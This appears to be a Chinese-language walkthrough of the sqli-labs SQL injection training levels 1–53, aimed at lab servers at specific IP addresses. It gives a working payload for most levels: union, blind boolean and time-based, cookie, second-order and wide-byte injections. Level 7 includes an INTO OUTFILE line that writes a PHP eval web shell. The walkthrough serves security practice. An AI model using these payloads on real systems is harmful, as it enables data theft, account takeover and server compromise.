## 第一天 1-20

### 第一题 
https://39.106.131.237/sqli/Less-1/?id=-1&#8242; union select 1,schema_name,3 from information_schema.schemata limit 5,1–+

### 第二题
https://39.106.131.237/sqli/Less-2/?id=1 and 1=2 union select 1,2,3 from information_schema.schemata–+

### 第三题
http://202.206.96.155:8081/sqli-labs/Less-3/?id=999′) union select 1,2,3 and (‘1’=’1
这个添加了括号 要先用括号闭合 而且回显有错误所以就很好构造了

### 第四题
http://202.206.96.155:8081/sqli-labs/Less-4/?id=-1″) union select 1,2,3 and (“1″=”1
这个涉及到一个知识点 双引号可以包含单引号 所以要把单引号改成双引号

### 第五题
http://202.206.96.155:8081/sqli-labs/Less-5/?id=-1′ or 1=(select if(ascii(substr(database(),1,1))>115,1,2))–%20 基于布尔的盲注 反正我是这样做出来的

### 第六题
http://202.206.96.155:8081/sqli-labs/Less-6/?id=-1” or 1=(select if(ascii(substr(database(),1,1))>115,1,2))–%20 well 改成双引号就好了。。。

### 第七题
http://202.206.96.155:8081/sqli-labs/Less-7/?id=1’ and 1=(select if(ascii(substr(database(),1,1))>115,1,2)) and ‘1’=’1
不知道怎么的 注释突然不管用了
而且这个题根据题目的提示 还涉及到into outfile
常用的语句是：
````select “<?php @eval($_POST[‘giantbranch’]);?>” into outfile “XXX\test.php” ````当这里要获取到网站的在系统中的具体路径（绝对路径）
这个要怎么获取呢，根据系统和数据库猜测，如winserver的iis默认路径是c:/inetpub/wwwroot/，这好像说偏了，这是asp的，但知道也好
linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等
apache 就/var/www/htm，/var/www/html/htdocs
@@datadir 读取数据库路径
@@basedir MYSQL 获取安装路径

### 第八题
http://202.206.96.155:8081/sqli-labs/Less-8/?id=1′ and 1=(select if(ascii(substr(database(),1,1))>115,2,2)) and ‘1’=’1
难道这句话通杀麽。。。

### 第九题
http://202.206.96.155:8081/sqli-labs/Less-9/?id=1′ and (select if(ascii(substr(database(),1,1))>115,sleep(5),2)) and ‘1’=’1
题目提示了是基于时间的注入

### 第十题
http://202.206.96.155:8081/sqli-labs/Less-10/?id=1″ and (select if(ascii(substr(database(),1,1))>115,sleep(5),2)) and “1”=”1
http://202.206.96.155:8081/sqli-labs/Less-10/?id=1&#8243; and (select if(1=1,sleep(5),2)) %23
这次试了试注释 好用

### 第十一题
我猜的原来的查询语句样子：
select * from tablename where username=$_[‘username’] and password=$_[‘password’]
post内容 uname=a’ or 1 –%20&passwd=

### 第十二题
原来的查询语句大致是这个样子的：
````select * from tablename where username=($_[‘username’]) and password=($_[‘password’])````
所以post的数据要改成 uname=a”) or 1 %23&passwd= 而且题目也提示是双引号了

### 第十三题
这个题目吧，我觉得幸亏用回显报错，要不然这么菜的我肯定是正不出来的，，，
原来的语句：
````select * from tablename where username=$_[‘username’] and password=($_[‘password’])````
post的数据：uname=a or 1&passwd=a’) or 1 %23

### 第十四题
uname=a’&passwd=a” or “1”=”1 挺简单滴

### 第十五题
uname=a’ or ‘1’=’1&passwd=a’ or ‘1’=’1

### 第十六题
uname=a” or (select if(1=2,sleep(5),sleep(0))) or “1”=”1&passwd=a” or “1”=”1

### 十八 十九 二十 在各个头地方注入，，，提示很全了

嗯 再接再厉，明天继续

(select if(1=1,1,2))

q=Banana’)%20and%201=1%20and%20(‘1’=’1

## 第二天 21-38
###第20题
http://202.206.96.155:8081/sqli-labs/Less-20/index.php
这个真是纠结了半天，为什么没有回显呢 我的cookie也没有呢，，，原来还要登陆一下子才好
然后将cookie的值修改成要查询的内容就好了 还是原来的order by 和union select，，，
cookie的值：’ union select version(),database(),user()#

### 第21题
这次还是一个cookie的注入，和20题是一样的，不同之处在于将cookie的值进行base64
编码了，我们只需将我们的payload进行base64 编码即可，还有一点要注意的是 至此多了一个 括号的闭合 给出payload ‘) union select database(),version(),version() # 将其编码即可

### 第二十二题
给出payload：” union select database(),version(),version() #
也是cookie的注入 记得base64 编码

### 第二十三题
http://202.206.96.155:8081/sqli-labs/Less-23/?id=1’ and 1=(select if(1=1,2,1)) and ‘1’=’1 额 这不是part 1的做法麽，难道这一套是做法通用的吗，，，，

### 第二十四题
这个题比较有意思 本关为二次排序注入的示范例。二次排序注入也成为存储型的注入，就是将可能导致sql注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。
推荐看一下源码，尤其是login 与 creat页面，我在这里浪费了不少时间
其实sql注入点在修改页面，而我一心想的是哪个用户名的回显是不是可以造成注入，，，
先注册用户名为 admin’ # 然后登陆 修改密码修改密码时Sql语句变为
````UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ AND password=’ ````，也就是执行了````UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’````
然后就可以用admin登陆了
话说孰能绕过mysql_real_escape_string记得教教我噻

### 第二十五题
and or 被过滤了 有两种绕过方式 可用union
http://202.206.96.155:8081/sqli-labs/Less-25/?id=?id=1&#8242; oorr(anandd) ‘1’=’1
http://202.206.96.155:8081/sqli-labs/Less-25/?id=?id=1&#8242; || ‘1’=’1

### 第二十五a题
http://202.206.96.155:8081/sqli-labs/Less-25a/?id=1 anandd 1=2

### 第二十六题 
空格被注释掉了 但是可以用%a0来过滤呀 /**/应该也可以 不过在a中用不了。。。而且，，第二十六题吧，空格我发现没有被过滤貌似
http://127.0.0.1/sqllib/Less-26a/?id=100&#8242;)union%a0select%a01,user(),(‘3

### 第二十六a题
http://127.0.0.1/sqllib/Less-26a/?id=100’)union%a0select%a01,user(),(‘3

### 第二十七题
大小写以及重复都可以绕过限制在这里提一下 最后的’1’=’1 闭合可以用’1直接闭合
http://202.206.96.155:8081/sqli-labs/Less-27/?id=999’%a0ununionion%a0SelEcT%a01,2,3%a0and%a0’1’=’1

### 第二十七a
提示是双引号
http://202.206.96.155:8081/sqli-labs/Less-27a/?id=999″%a0ununionion%a0SelEcT%a01,2,3%a0and%a0″1

### 第二十八
有点让人无语，说好的union selsce过滤呢，，，
http://202.206.96.155:8081/sqli-labs/Less-28/?id=100&#8217;)union%a0select%a01,user(),(‘3

### 第二十八a
这两个题目有什么不同麽，，，，
http://202.206.96.155:8081/sqli-labs/Less-28a/?id=100&#8217;)union%a0select%a01,user(),(‘3

### 第二十九
难道这个是万能的麽，，，
http://202.206.96.155:8081/sqli-labs/Less-29/?id=1&#8217; and 1=(select if(ascii(substr(database(),1,1))>0,1,2)) and ‘1’=’1

### 第三十题
感觉都是重复啦
http://202.206.96.155:8081/sqli-labs/Less-30/?id=100&#8243; union select 1,2,3 and “1”=”1

### 第三十一题
上一题的基础上加个括号而已
http://202.206.96.155:8081/sqli-labs/Less-31/?id=100&#8243;) union select 1,2,3 and (“1″=”1

### 第三十二题
看源码可知 将单引号与双引号过滤了以及\ 过滤方法是加入\\
````$string = preg_replace(‘/’. preg_quote(‘\\’) .’/’, “\\\\\\”, $string); //escape any backslash
$string = preg_replace(‘/\’/i’, ‘\\\”, $string); //escape single quote with a backslash
$string = preg_replace(‘/\”/’, “\\\””, $string); //escape double quote with a backslash````

这里有一个很好的知识点：GBK的宽字节注入：%df 与 %5c 连在一起组合成 運 单引号依然在，成功闭合 用%a1也可以
paylload为：http://202.206.96.155:8081/sqli-labs/Less-32/?id=-3%df’ union select 1,2,3 –+

### 第三十三题
同上 只不过是换了一种加”\”的方式addslashes()

### 第三十四题
utf-8相关的宽字节注入 錦”这个字，它的utf-8编码是0xe98ca6，它的gbk编码是0xe55c。当我们的錦被iconv从utf-8转换成gbk后，变成了%e5%5c，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。
payload为：uname=a錦%27union select 1,2#&passwd=a&submit=Submit

### 第三十五题
去看源码，造成这么简单肯定是由原因的
```
http://202.206.96.155:8081/sqli-labs/Less-35/?id=-1 union select 1,2,3–+
if(isset($_GET[‘id’]))
{
$id=check_addslashes($_GET[‘id’]);
//echo “The filtered request is :” .$id . “<br>”;

//logging the connection parameters to a file for analysis.
$fp=fopen(‘result.txt’,’a’);
fwrite($fp,’ID:’.$id.”\n”);
fclose($fp);
mysql_query(“SET NAMES gbk”);——————————–>>
```
这里应该是自己把\\给编码走了
````$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1″;
$result=mysql_query($sql);
$row = mysql_fetch_array($result);````

### 第三十六题
mysql_real_escape_string()
数据库字符集设为GBK时，0xbf27本身不是一个有效的GBK字符，但经过 addslashes() 转换后变为0xbf5c27，前面的0xbf5c是个有效的GBK字符，所以0xbf5c27会被当作一个字符0xbf5c和一个单引号来处理，结果漏洞就触发了。

mysql_real_escape_string() 也存在相同的问题，只不过相比 addslashes() 它考虑到了用什么字符集来处理，因此可以用相

应的字符集来处理字符。

http://202.206.96.155:8081/sqli-labs/Less-36/?id=-1%df’union select 1,2,3–+

### 第三十七题
uname=a錦’union select 1,2#&passwd=a&submit=Submit

### 去了解一下堆叠查询吧 ; 这个题没啥特殊的

## 第三天 38-53
今天来刷第三部分，呀呀呀，第三部分的题目比较少，希望能刷的快一点，然后进攻第四部分，嘻嘻。

### 第三十八题
http://202.206.96.155:8081/sqli-labs/Less-38/?id=0′ union select 1,2,3–+

### 第三十九题
http://202.206.96.155:8081/sqli-labs/Less-39/?id=0 union select 1,2,3–+

### 第四十题
http://202.206.96.155:8081/sqli-labs/Less-40/?id=1′ and 1=1 and ‘1’=’1
我在纠结后面的题目要不要继续做下去 因为真的一句话就可以过好几关，这个推荐你们用基于时间的注入试试

### 第四十一题
http://202.206.96.155:8081/sqli-labs/Less-41/?id=1 and 1=2
基于布尔的盲注，整型的 不用闭合单引号

### 第四十二题
用户名 a’ or ‘1’=’1 密码：b’ or ‘1’=’1′ limit 1,1 # 修改limit参数，可以修改任意用户名

### 第四十三题
用户名 a’) or ‘1’=’1 密码：b’) or ‘1’=’1′ limit 1,1 #
修改limit参数，可以修改任意用户名

### 第四十四题
同第四十二题

### 第四十五题
同第四十三题

### 第四十六题
后台的查询语句为$sql = “select * from users order by $sort”;
和之前遇到的有点不一样
可以利用http://202.206.96.155:8081/sqli-labs/Less-46/?sort=if(1=1,1,2)

### 第四十七题
http://202.206.96.155:8081/sqli-labs/Less-47/?sort=2′ and if(1=1,1,sleep(1)) and ‘1’=’1
基于布尔的实现不了了，只能用时间啦啦啦 by the way 我不喜欢用报错注入，以上的很多题目都可以用报错注入的，我没有提供报错注入的方式，因为实际当中，一般网站是不会给那么详细的错误回显的

### 第四十八题
http://202.206.96.155:8081/sqli-labs/Less-48/?sort=2 and if(1=1,1,sleep(1))
不知道为什么基于布尔的不管用来了，，，

### 第四十九题
http://202.206.96.155:8081/sqli-labs/Less-49/?sort=2′ and if(1=2,1,sleep(1)) and ‘1’=’1

### 第五十题
http://202.206.96.155:8081/sqli-labs/Less-50/?sort=2 and if(1=2,1,sleep(1))
嗯，，，出题人能不能用点心呢，，，为什么方法都差不多嘞，，，

### 第五十一题
http://202.206.96.155:8081/sqli-labs/Less-51/?sort=2′ and if(1=2,1,sleep(1)) and ‘1’=’1
，，，，无力吐槽，，，

### 第五十二题：，，，，

### 第五十三题：，，，，